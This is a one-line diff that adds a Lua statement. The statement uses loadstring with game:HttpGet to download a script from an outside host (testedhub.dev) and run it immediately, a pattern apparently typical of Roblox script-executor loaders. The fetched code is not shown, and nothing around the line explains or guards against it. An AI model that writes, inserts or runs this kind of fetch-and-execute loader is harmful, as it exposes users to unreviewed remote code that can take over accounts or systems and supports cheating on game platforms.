@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://testedhub.dev/releases/hybrid.txt"))()
